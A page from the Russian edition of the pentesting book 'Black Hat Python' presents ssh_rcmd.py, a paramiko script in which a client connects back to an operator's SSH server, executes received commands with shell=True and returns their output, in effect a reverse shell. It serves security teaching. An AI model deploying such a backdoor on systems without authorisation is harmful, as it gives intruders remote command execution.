# Black Hat Python. Программирование для хакеров и пентестеров — страница 46

Источник: `Black Hat Python. Программирование для хакеров и пентестеров.pdf`

46   Глава 2. Основные сетевые инструменты
Разобравшись с основами, модифицируем этот скрипт, чтобы он мог выпол-
нять команды по SSH на Windows-клиенте. Конечно, обычно для подклю -
чения к SSH-серверу используют SSH-клиент, но поскольку в стандартной
поставке большинства версий Windows нет SSH-сервера, нам нужно поменять
сервер и клиент местами, чтобы первый мог слать команды второму .
Создайте файл с именем ssh_rcmd.py и наберите следующее:
import paramiko
import shlex
import subprocess
def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
    print(ssh_session.recv(1024).decode())
    while True:
        command = ssh_session.recv(1024) 
        try:
            cmd = command.decode()
            if cmd == 'exit':
                client.close()
                break
            cmd_output = subprocess.check_output(shlex.split(cmd), shell=True) 
            ssh_session.send(cmd_output or 'okay') 
        except Exception as e:
            ssh_session.send(str(e))
        client.close()
    return
if __name__ == '__main__':
    import getpass
    user = getpass.getuser()
    password = getpass.getpass()
    ip = input('Enter server IP: ')
    port = input('Enter port: ')
    ssh_command(ip, port, user, password, 'ClientConnected') 
Верхняя часть у этой программы такая же, как и у предыдущей. Различия на-
чинаются в цикле while True:. Вместо выполнения одной команды, как делали
ранее, мы последовательно берем команды из соединения , выполняем их 
и затем возвращаем весь вывод вызывающей стороне .
